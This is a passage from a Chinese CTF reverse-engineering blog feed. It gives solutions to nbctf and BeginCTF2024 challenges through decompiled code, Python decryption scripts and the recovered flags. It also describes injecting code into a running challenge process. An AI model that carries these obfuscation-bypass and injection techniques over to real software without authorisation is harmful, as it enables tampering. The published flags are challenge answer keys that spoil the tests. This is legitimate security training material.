class="number">0x12</span>) == v6[<span class="number">3</span>]</span><br><span class="line">        &amp;&amp; (v6[<span class="number">3</span>] ^ <span class="number">0x38</span>) == *v6</span><br><span class="line">        &amp;&amp; *v6 == <span class="number">0x6C</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = encrypto(input);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">      v7 = check1_var_add(input);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v13[i] + v13[i + <span class="number">1</span>] * v7[i] != v11[i] )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = encrypto(input);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">      v8 = check1_var_add(input);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0LL</span>; j &lt;= <span class="number">4</span>; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 += data[j] + (v8[j] &lt;&lt; <span class="number">7</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v5 != v10[j] )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = encrypto2(input);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">      v9 = check1_var_add(input);</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0LL</span>; k &lt;= <span class="number">4</span>; ++k )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v12[k] != ((v9[k] &gt;&gt; (k + <span class="number">3</span>)) | (v9[k] &lt;&lt; (<span class="number">32</span> - (k + <span class="number">3</span>)))) )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = encrypto(input);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7LL</span>:</span><br><span class="line">      qword_404308 = *check1_var_add(input);</span><br><span class="line">      result = *&amp;qword_404308 == <span class="number">3.325947034342098e151</span> &amp;&amp; encrypto(input);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//================================================</span></span><br><span class="line"></span><br><span class="line">_BYTE *__fastcall <span class="title function_">check1_var_add</span><span class="params">(_BYTE *input_6)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = var++;</span><br><span class="line">  v5 = word_404090[v1];                         <span class="comment">// 下划线数量</span></span><br><span class="line">  <span class="keyword">while</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *++input_6 == <span class="string">&#x27;&#125;&#x27;</span> || !*input_6 )       <span class="comment">// *(input + 1) == &#x27;&#125;&#x27; || !*input</span></span><br><span class="line">                                                <span class="comment">// input++</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = print(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Aww shucks!&quot;</span>);</span><br><span class="line">      println(v2, &amp;MEMORY[<span class="number">0x7F456B738680</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *input_6 == <span class="string">&#x27;_&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++input_6;</span><br><span class="line">      --v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> input_6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两个加密函数都调用了的<code>check1_var_add(_BYTE *input_6)</code>实际上是一个通过当前”步数”(<code>var</code> 对应每个case块的加密)来返回当前加密的单词在整个flag中的位置(flag中每个单词用<code>_</code>分割) 动态调试时发现步数和位置的对应关系如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">index:    <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">8</span></span><br><span class="line">var:    <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span></span><br></pre></td></tr></table></figure>

<p>其实得到了这些信息后一步步攻破每个case块的加密即可 但看出<code>check1_var_add(_BYTE *input_6)</code>的作用实际上也是一个 以下给出每个加密块对应的解密脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># case 1:</span></span><br><span class="line">flag = []</span><br><span class="line">flag.append(<span class="number">0x6C</span>)</span><br><span class="line">flag.append(flag[<span class="number">0</span>] ^ <span class="number">0x5F</span>)</span><br><span class="line">flag.append(flag[<span class="number">1</span>] ^ <span class="number">0x75</span>)</span><br><span class="line">flag.append(flag[<span class="number">2</span>] ^ <span class="number">0x12</span>)</span><br><span class="line">flag.append(flag[<span class="number">3</span>] ^ <span class="number">0x38</span>)</span><br><span class="line">flag[<span class="number">0</span>] = [<span class="built_in">chr</span>(val) <span class="keyword">for</span> val <span class="keyword">in</span> flag]</span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"><span class="comment"># l3FTl __5</span></span><br><span class="line"><span class="comment"># l3FT  __5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># case 2:</span></span><br><span class="line">flag = [<span class="literal">None</span>] * <span class="number">4</span></span><br><span class="line">flag[<span class="number">0</span>] = <span class="number">0x4808</span></span><br><span class="line">flag[<span class="number">1</span>] = <span class="number">0xc40</span></span><br><span class="line">flag[<span class="number">2</span>] = <span class="number">0x480c</span></span><br><span class="line">flag[<span class="number">3</span>] = <span class="number">0x408c</span></span><br><span class="line">flag = [val &gt;&gt; <span class="number">2</span> <span class="keyword">for</span> val <span class="keyword">in</span> flag]</span><br><span class="line">flag = [<span class="built_in">chr</span>(val &amp; <span class="number">3</span> | ((val &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span>) &lt;&lt; <span class="number">2</span> | ((val &gt;&gt; <span class="number">8</span>) &amp; <span class="number">3</span>) &lt;&lt; <span class="number">4</span> | ((val &gt;&gt; <span class="number">12</span>) &amp; <span class="number">3</span>) &lt;&lt; <span class="number">6</span>) <span class="keyword">for</span> val <span class="keyword">in</span> flag]</span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"><span class="comment"># b4cK __8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># case 3:</span></span><br><span class="line">flag = [<span class="literal">None</span>] * <span class="number">5</span></span><br><span class="line">flag[<span class="number">0</span>] =  <span class="number">0x1c1f75</span></span><br><span class="line">flag[<span class="number">1</span>] =  <span class="number">0x364d4</span></span><br><span class="line">flag[<span class="number">2</span>] =  <span class="number">0x4f1d2a</span></span><br><span class="line">flag[<span class="number">3</span>] =  <span class="number">0x460a19</span></span><br><span class="line">flag[<span class="number">4</span>] =  <span class="number">0x215405</span></span><br><span class="line">key = [<span class="literal">None</span>] * <span class="number">6</span></span><br><span class="line">key[<span class="number">0</span>] = <span class="number">0xD4F3</span></span><br><span class="line">key[<span class="number">1</span>] = <span class="number">0x3D49</span></span><br><span class="line">key[<span class="number">2</span>] = <span class="number">0x107B</span></span><br><span class="line">key[<span class="number">3</span>] = <span class="number">0xC479</span></span><br><span class="line">key[<span class="number">4</span>] = <span class="number">0xAA84</span></span><br><span class="line">key[<span class="number">5</span>] = <span class="number">0x9807</span></span><br><span class="line">flag = [<span class="built_in">chr</span>(<span class="built_in">int</span>((flag[i] - key[i]) / key[i + <span class="number">1</span>])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"><span class="comment"># r1gh7 __3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># case 4 &amp; 5:</span></span><br><span class="line">enc = [<span class="literal">None</span>] * <span class="number">5</span></span><br><span class="line">enc[<span class="number">0</span>] = <span class="number">0x394C</span></span><br><span class="line">enc[<span class="number">1</span>] = <span class="number">24063</span></span><br><span class="line">enc[<span class="number">2</span>] = <span class="number">37349</span></span><br><span class="line">enc[<span class="number">3</span>] = <span class="number">50716</span></span><br><span class="line">enc[<span class="number">4</span>] = <span class="number">61563</span></span><br><span class="line">copy = [val <span class="keyword">for</span> val <span class="keyword">in</span> enc]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">0</span>:</span><br><span class="line">        enc[i] -= copy[i - <span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(enc[i] &gt;&gt; <span class="number">7</span>), <span class="built_in">chr</span>(enc[i] % <span class="number">0x80</span>))</span><br><span class="line"><span class="comment"># r L</span></span><br><span class="line"><span class="comment"># I 3</span></span><br><span class="line"><span class="comment"># g f</span></span><br><span class="line"><span class="comment"># h 7</span></span><br><span class="line"><span class="comment"># T _</span></span><br><span class="line"><span class="comment"># index:</span></span><br><span class="line"><span class="comment"># 4 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># case 5:</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">enc = [<span class="literal">None</span>] * <span class="number">100</span></span><br><span class="line">enc[<span class="number">0</span>] = <span class="number">0x4000000a</span></span><br><span class="line">enc[<span class="number">1</span>] = <span class="number">0x90000006</span></span><br><span class="line">enc[<span class="number">2</span>] = <span class="number">0x38000003</span></span><br><span class="line">enc[<span class="number">3</span>] = <span class="number">0x20000001</span></span><br><span class="line">enc[<span class="number">4</span>] = <span class="number">0x6e000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(enc[i] &gt;&gt; (<span class="number">32</span> - (i + <span class="number">3</span>)) | enc[i] &lt;&lt; (i + <span class="number">3</span>) &amp; <span class="number">0xFF</span>)</span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"><span class="comment"># RigH7 __7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># case 6:</span></span><br><span class="line">enc[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">enc[<span class="number">1</span>] = <span class="number">0x10</span></span><br><span class="line">enc[<span class="number">2</span>] = <span class="number">0x20</span></span><br><span class="line">enc[<span class="number">3</span>] = <span class="number">0x200</span></span><br><span class="line">enc[<span class="number">4</span>] = <span class="number">0x400</span></span><br><span class="line">enc[<span class="number">5</span>] = <span class="number">0x800</span></span><br><span class="line">enc[<span class="number">6</span>] = <span class="number">0x2000</span></span><br><span class="line">enc[<span class="number">7</span>] = <span class="number">0x4000</span></span><br><span class="line"><span class="comment"># print(chr(0x31), chr(0x6E))</span></span><br><span class="line"><span class="comment"># 1n __6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># case 7:</span></span><br><span class="line">x = <span class="number">0x5F64523477723066</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((x &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0XFF</span>), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># f0rw4Rd_ __2</span></span><br></pre></td></tr></table></figure>

<p>最后问题来了 实际上call rax对应到伪代码就是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">8LL</span>:</span><br><span class="line">      v13 = check1_var_add(input_6);</span><br><span class="line">      <span class="keyword">for</span> ( m = <span class="number">0LL</span>; m &lt;= <span class="number">5</span>; ++m )</span><br><span class="line">        LOBYTE(v17) = v13[m] ^ v15[m];</span><br><span class="line">        (&amp;v17)();		<span class="comment">//调用v17</span></span><br><span class="line">      result = <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>那么其实rax是根据计算得到的不确定的值 但是原来的程序少了这一步貌似也是甚至就应该这样照常运行 那么什么时候call rax相当于什么都没做呢?</p>
<ol>
<li>call $+5	;花指令</li>
<li>call rax     ;rax -&gt; ret 调用后立即返回</li>
</ol>
<p>第一种显然不太可能 那就是当<code>rax == retn(C3)</code>时了! 于是写出最后一块解密脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># case 8:</span></span><br><span class="line">enc = [<span class="literal">None</span>] * <span class="number">6</span></span><br><span class="line">enc[<span class="number">0</span>] = <span class="number">0xb1</span></span><br><span class="line">enc[<span class="number">1</span>] = <span class="number">0xa6</span></span><br><span class="line">enc[<span class="number">2</span>] = <span class="number">0xb7</span></span><br><span class="line">enc[<span class="number">3</span>] = <span class="number">0xb6</span></span><br><span class="line">enc[<span class="number">4</span>] = <span class="number">0xb1</span></span><br><span class="line">enc[<span class="number">5</span>] = <span class="number">0xad</span></span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(each ^ <span class="number">0xC3</span> &amp; <span class="number">0xFF</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># return __9</span></span><br></pre></td></tr></table></figure>

<p>最后组合起来得到最终flag:<code>nbctf&#123;L3f7_f0rw4Rd_r1gh7_rIghT_l3FT_1n_RigH7_b4cK_return&#125;</code></p>
<p>(其实<code>nbctf&#123;L3f7_f0rw4Rd_r1gh7_rIghT_l3FTl_1n_RigH7_b4cK_return</code>也能让程序返回正确的提示 但显然是非预期解)</p>
<h2 id="wee-woo-栈机逆向"><a href="#wee-woo-栈机逆向" class="headerlink" title="wee-woo | 栈机逆向"></a>wee-woo | 栈机逆向</h2><p><a href="https://1k0ct.github.io/2024/03/05/%E5%8F%A4%E7%A5%9E%E8%AF%AD%E4%B9%8B%E7%A0%94%E7%A9%B6/#%E5%BA%94%E7%94%A8%E5%AE%9E%E4%BE%8B">UIUA研究</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>REV</category>
        <category>WPs</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>BeginCTF2024逆向方向wp</title>
    <url>/2024/02/23/BeginCTF2024%E9%80%86%E5%90%91%E6%96%B9%E5%90%91wp/</url>
    <content><![CDATA[<p>参赛ID:1K0CT</p>
<p>email:<a href="mailto:&#111;&#107;&#117;&#117;&#x73;&#x75;&#107;&#117;&#x40;&#103;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#x6f;&#x6d;">&#111;&#107;&#117;&#117;&#x73;&#x75;&#107;&#117;&#x40;&#103;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#x6f;&#x6d;</a></p>
<span id="more"></span>

<h2 id="superguesser-动态调试"><a href="#superguesser-动态调试" class="headerlink" title="superguesser | 动态调试"></a>superguesser | 动态调试</h2><p>静态分析发现函数全部被混淆 在入口下断点步过函数直到进入被还原的函数 找到核心加密逻辑:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_401530</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 <span class="built_in">stack</span>; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// zf</span></span><br><span class="line">  __int64 (*v2)(<span class="type">void</span>); <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rsp</span></span><br><span class="line">  __int64 v4; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// of</span></span><br><span class="line"></span><br><span class="line">  (loc_46EB33)();</span><br><span class="line">  _disable();</span><br><span class="line">  (loc_46EB77)();</span><br><span class="line">  (loc_46EBB4)();</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">    JUMPOUT(<span class="number">0x401548</span>i64);</span><br><span class="line">  (loc_46EBF7)();</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">96</span>) = <span class="number">81</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">95</span>) = <span class="number">81</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">94</span>) = <span class="number">82</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">93</span>) = <span class="number">95</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">92</span>) = <span class="number">89</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">91</span>) = <span class="number">67</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">90</span>) = <span class="number">93</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">89</span>) = <span class="number">95</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">88</span>) = <span class="number">89</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">87</span>) = <span class="number">73</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">86</span>) = <span class="number">90</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">85</span>) = <span class="number">89</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">84</span>) = <span class="number">86</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">83</span>) = <span class="number">46</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">82</span>) = <span class="number">38</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">81</span>) = <span class="number">29</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">80</span>) = <span class="number">42</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">79</span>) = <span class="number">55</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">78</span>) = <span class="number">26</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">77</span>) = <span class="number">39</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">76</span>) = <span class="number">41</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">75</span>) = <span class="number">23</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">74</span>) = <span class="number">40</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">73</span>) = <span class="number">36</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">72</span>) = <span class="number">42</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">71</span>) = <span class="number">56</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">70</span>) = <span class="number">37</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">69</span>) = <span class="number">33</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">68</span>) = <span class="number">61</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">67</span>) = <span class="number">15</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">66</span>) = <span class="number">50</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">65</span>) = <span class="number">58</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">64</span>) = <span class="number">60</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">63</span>) = <span class="number">61</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">62</span>) = <span class="number">54</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">61</span>) = <span class="number">51</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">60</span>) = <span class="number">42</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">59</span>) = <span class="number">0</span>;</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">24</span>) = (loc_46EC76)(<span class="built_in">stack</span> - <span class="number">96</span>);</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">25</span>) = <span class="number">51</span>;</span><br><span class="line">  v2 = (loc_46ECB3)();</span><br><span class="line">  __outbyte(<span class="number">0x2F</span>u, v2);</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">26</span>) = v2();</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">40</span>) = *(<span class="built_in">stack</span> - <span class="number">24</span>) - <span class="number">1</span>i64;</span><br><span class="line">  (loc_46ECF6)();</span><br><span class="line">  (loc_46ED38)();</span><br><span class="line">  v3 = alloca((loc_46ED75)());</span><br><span class="line">  *(<span class="built_in">stack</span> - <span class="number">48</span>) = alloc();</span><br><span class="line">  (scanf_0)(v4, *(<span class="built_in">stack</span> - <span class="number">48</span>));</span><br><span class="line">  (loc_46EE32)();</span><br><span class="line">  (loc_46EEB1)();</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    JUMPOUT(<span class="number">0x401651</span>i64);</span><br><span class="line">  <span class="keyword">while</span> ( *(<span class="built_in">stack</span> - <span class="number">20</span>) &lt; *(<span class="built_in">stack</span> - <span class="number">24</span>) )</span><br><span class="line">    *(*(<span class="built_in">stack</span> - <span class="number">48</span>) + (*(<span class="built_in">stack</span> - <span class="number">20</span>))++) ^= *(<span class="built_in">stack</span> - <span class="number">20</span>) + *(<span class="built_in">stack</span> - <span class="number">25</span>) + <span class="number">17</span> * *(<span class="built_in">stack</span> - <span class="number">26</span>);<span class="comment">// i + ? + 17 * ??</span></span><br><span class="line">  <span class="keyword">if</span> ( !(cmp)(*(<span class="built_in">stack</span> - <span class="number">48</span>), <span class="built_in">stack</span> - <span class="number">96</span>, *(<span class="built_in">stack</span> - <span class="number">24</span>)) )</span><br><span class="line">  &#123;</span><br><span class="line">    (loc_46F030)();</span><br><span class="line">    JUMPOUT(<span class="number">0x4016E8</span>i64);</span><br><span class="line">  &#125;</span><br><span class="line">  (loc_46EF73)();</span><br><span class="line">  <span class="keyword">return</span> (loc_46EFF3)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>动调发现<code>stack-48</code>处存放的就是输入的flag 而只有这一处加密 由于不确定<code>*(stack - 26)</code>的值是否因为反调试手段被修改 故用爆破方法解flag:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [<span class="number">81</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">95</span>, <span class="number">89</span>, <span class="number">67</span>, <span class="number">93</span>, <span class="number">95</span>, <span class="number">89</span>, <span class="number">73</span>, <span class="number">90</span>, <span class="number">89</span>, <span class="number">86</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">29</span>, <span class="number">42</span>, <span class="number">55</span>, <span class="number">26</span>, <span class="number">39</span>, <span class="number">41</span>, <span class="number">23</span>, <span class="number">40</span>, <span class="number">36</span>, <span class="number">42</span>, <span class="number">56</span>, <span class="number">37</span>, <span class="number">33</span>, <span class="number">61</span>, <span class="number">15</span>, <span class="number">50</span>, <span class="number">58</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">54</span>, <span class="number">51</span>, <span class="number">42</span>]</span><br><span class="line"><span class="keyword">for</span> ran <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        flag += <span class="built_in">chr</span>((enc[i] ^ (i + <span class="number">0x33</span> + <span class="number">17</span> * ran)) &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">if</span> flag[:<span class="number">5</span>] == <span class="string">&quot;begin&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="comment"># begin&#123;debugging_is_an_anathor_choice&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="ezpython-注入解法"><a href="#ezpython-注入解法" class="headerlink" title="ezpython | 注入解法"></a>ezpython | 注入解法</h2><p>用pyinstxtractor解包出的key和enc无法通过sm4解密得到flag 故使用原程序的环境进行解密 原程序反编译后主要逻辑:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm4</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> key, enc</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad_pkcs7</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;PKCS#7填充&quot;&quot;&quot;</span></span><br><span class="line">    padding_len = <span class="number">16</span> - <span class="built_in">len</span>(data) % <span class="number">16</span></span><br><span class="line">    padding = <span class="built_in">bytes</span>([padding_len] * padding_len)</span><br><span class="line">    <span class="keyword">return</span> data + padding</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpad_pkcs7</span>(<span class="params">padded_data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;PKCS#7去填充&quot;&quot;&quot;</span></span><br><span class="line">    padding_len = padded_data[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> padded_data[:-padding_len]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM4</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.gmsm4 = sm4.CryptSM4()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encryptSM4</span>(<span class="params">self, encrypt_key, value</span>):</span><br><span class="line">        gmsm4 = self.gmsm4</span><br><span class="line">        gmsm4.set_key(encrypt_key.encode(), sm4.SM4_ENCRYPT)</span><br><span class="line">        padded_value = pad_pkcs7(value.encode())</span><br><span class="line">        encrypt_value = gmsm4.crypt_ecb(padded_value)</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(encrypt_value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = <span class="built_in">input</span>(<span class="string">&quot;...&quot;</span>)</span><br><span class="line">    sm4_instance = SM4()</span><br><span class="line">    flag_1 = sm4_instance.encryptSM4(key, flag)</span><br><span class="line">    <span class="keyword">if</span> flag_1 == enc:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Failed&quot;</span>)</span><br></pre></td></tr></table></figure>



<p> 在powershell启动题目程序(用cmd或者直接启动貌似不行) 找到该程序的pid 使用de4py的PyShell功能将以下解密代码注入到程序:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decryptSM4</span>(<span class="params">self, encrypt_key, enc</span>):</span><br><span class="line">    gmsm4 = self.gmsm4</span><br><span class="line">    gmsm4.set_key(encrypt_key.encode(), sm4.SM4_DECRYPT)</span><br><span class="line">    encrypt_value = base64.b64decode(enc)</span><br><span class="line">    decrypt_value = gmsm4.crypt_ecb(encrypt_value)</span><br><span class="line">    <span class="keyword">return</span> unpad_pkcs7(decrypt_value).decode()</span><br><span class="line"></span><br><span class="line">SM4.decrypt = decryptSM4</span><br><span class="line">sm4_new = SM4()</span><br><span class="line"><span class="built_in">print</span>(sm4_new.decrypt(key, enc))</span><br></pre></td></tr></table></figure>

<p>效果:<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-110630.png"></p>
<h3 id="24-3-23更新正常解"><a href="#24-3-23更新正常解" class="headerlink" title="24&#x2F;3&#x2F;23更新正常解"></a>24&#x2F;3&#x2F;23更新正常解</h3><p>​	–原题魔改了国密库</p>
<h2 id="goforfun-go语言逆向"><a href="#goforfun-go语言逆向" class="headerlink" title="goforfun | go语言逆向"></a>goforfun | go语言逆向</h2><p>第一个加密的核心特征:</p>
